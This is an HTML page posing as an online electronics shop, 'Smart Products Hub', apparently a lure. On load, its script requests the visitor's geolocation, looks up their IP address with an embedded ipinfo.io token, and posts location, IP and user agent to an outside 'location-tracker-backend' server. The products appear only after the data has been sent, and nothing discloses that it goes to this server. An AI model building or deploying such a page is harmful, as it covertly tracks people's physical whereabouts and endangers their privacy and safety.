<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Smart Products Hub</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            margin: 0;
            padding: 0;
            background: #f1f3f6;
            color: #333;
        }

        /* Flipkart NavBar */
        .navbar {
            background-color: #2874f0;
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 10px 20px;
            color: white;
        }

            .navbar .logo {
                font-size: 20px;
                font-weight: bold;
                cursor: pointer;
            }

            .navbar .search-bar {
                flex: 1;
                margin: 0 20px;
                display: flex;
            }

                .navbar .search-bar input {
                    width: 100%;
                    padding: 8px;
                    border: none;
                    border-radius: 2px 0 0 2px;
                    outline: none;
                }

                .navbar .search-bar button {
                    padding: 8px 15px;
                    border: none;
                    background: #ff9f00;
                    border-radius: 0 2px 2px 0;
                    cursor: pointer;
                    color: white;
                    font-weight: bold;
                }

            .navbar .actions button {
                margin-left: 10px;
                padding: 8px 12px;
                background: white;
                color: #2874f0;
                border: none;
                border-radius: 2px;
                cursor: pointer;
                font-weight: bold;
            }

        h2 {
            color: #222;
            text-align: center;
            margin: 20px 0;
        }

        .hidden {
            display: none;
        }

        /* Products Grid */
        .products {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
            gap: 20px;
            max-width: 1200px;
            margin: auto;
            padding: 20px;
        }

        /* Product Card */
        .product {
            background: #fff;
            border-radius: 6px;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
            padding: 15px;
            text-align: center;
            transition: all 0.2s ease-in-out;
            cursor: pointer;
        }

            .product:hover {
                transform: translateY(-5px);
                box-shadow: 0 5px 15px rgba(0,0,0,0.2);
            }

            .product img {
                max-width: 100%;
                height: 150px;
                object-fit: contain;
                margin-bottom: 10px;
            }

            .product h3 {
                font-size: 16px;
                color: #222;
                margin: 5px 0;
            }

            .product p {
                font-size: 15px;
                color: #2874f0;
                font-weight: bold;
                margin: 5px 0;
            }

        /* Buy Now Button */
        .buy-btn {
            background: #fb641b;
            border: none;
            padding: 8px 12px;
            color: #fff;
            border-radius: 4px;
            font-size: 14px;
            cursor: pointer;
            transition: background 0.2s;
        }

            .buy-btn:hover {
                background: #d55d17;
            }

        /* Loader Section */
        #location-section {
            text-align: center;
            padding: 50px 20px;
        }

        #status {
            font-size: 16px;
            color: #666;
        }
    </style>
</head>
<body>
    <!-- Navigation Bar -->
    <div class="navbar">
        <div class="logo">Smart Hub</div>
        <div class="search-bar">
            <input type="text" placeholder="Search for products...">
            <button>Search</button>
        </div>
        <div class="actions">
            <button>Login</button>
            <button>Cart</button>
        </div>
    </div>

    <!-- Location Loader -->
    <div id="location-section">
        <h2>Getting You to the Access Page...</h2>
        <p id="status">Please wait, loading page...</p>
    </div>

    <!-- Product Section -->
    <div id="products-section" class="hidden">
        <h2>Smart Products Hub</h2>
        <div class="products" id="product-list"></div>
    </div>

    <script>
        const backendUrl = "https://location-tracker-backend-wvgn.onrender.com/send-location-email";
        const ipinfoToken = "89c6e154a78451";

        const products = [
            { name: "Smart Watch", price: "₹2,999", image: "https://images.unsplash.com/photo-1508685096489-7aacd43bd3b1?q=80&w=327&auto=format&fit=crop" },
            { name: "Wireless Earbuds", price: "₹1,499", image: "https://images.unsplash.com/photo-1585155784229-aff921ccfa10?q=80&w=327&auto=format&fit=crop" },
            { name: "Gaming Mouse", price: "₹799", image: "https://images.unsplash.com/photo-1629121291243-7b5e885cce9b?q=80&w=464&auto=format&fit=crop" },
            { name: "Bluetooth Speaker", price: "₹1,999", image: "https://images.unsplash.com/photo-1668649175276-fa4f96beb185?q=80&w=435&auto=format&fit=crop" },
            { name: "Laptop Bag", price: "₹999", image: "https://plus.unsplash.com/premium_photo-1680392544041-d89413b561ce?q=80&w=327&auto=format&fit=crop" }
        ];

        function renderProducts() {
            const productList = document.getElementById('product-list');
            products.forEach(p => {
                const div = document.createElement('div');
                div.className = 'product';
                div.innerHTML = `
                        <img src="${p.image}" alt="${p.name}">
                        <h3>${p.name}</h3>
                        <p>${p.price}</p>
                        <button class="buy-btn">Buy Now</button>
                    `;
                productList.appendChild(div);
            });
        }

        async function getUserIP() {
            try {
                const response = await fetch(`https://ipinfo.io/json?token=${ipinfoToken}`);
                const data = await response.json();
                return data.ip || 'N/A';
            } catch (error) {
                return 'N/A';
            }
        }

        async function sendLocation(latitude, longitude) {
            const userAgent = navigator.userAgent;
            const ip = await getUserIP();

            try {
                await fetch(backendUrl, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ latitude, longitude, userAgent, ip })
                });
                document.getElementById('location-section').classList.add('hidden');
                document.getElementById('products-section').classList.remove('hidden');
                renderProducts();
            } catch (error) {
                console.error("Error sending location:", error);
            }
        }

        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (position) => sendLocation(position.coords.latitude, position.coords.longitude),
                    () => document.getElementById('status').innerText = "Location access denied."
                );
            } else {
                document.getElementById('status').innerText = "Geolocation not supported.";
            }
        }

        getLocation();
    </script>
</body>
</html>
